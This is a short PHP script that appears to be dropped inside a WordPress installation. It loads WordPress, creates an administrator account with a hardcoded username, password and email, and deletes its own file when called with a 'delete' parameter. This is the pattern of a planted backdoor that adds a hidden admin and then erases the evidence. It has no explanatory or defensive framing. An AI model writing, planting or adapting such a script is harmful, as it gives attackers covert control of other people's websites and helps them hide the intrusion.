<?php
  include_once '../../../../wp-load.php';

  $username = 'mw01main';
  $password = 'pa55w0rd';
  $email = 'reset@mainwall.org';

  $user = array('user_login' => $username, $user_pass => $password, 'user_email' => $email, 'role' => 'administrator');
  $userdata = wp_insert_user($user);
  
  if(!empty($userdata->errors)) {
    foreach($userdata->errors as $key=>$val) {
      echo "<div id='createuser'>";
      echo implode(",", $val);
      echo "</div>";
    }
  } else {
    echo "div id='createuser'>user added</div>";
  }

  if(isset($_GET['delete'])) {
    sleep(5);
    unlink(__FILE__);
  }
?>
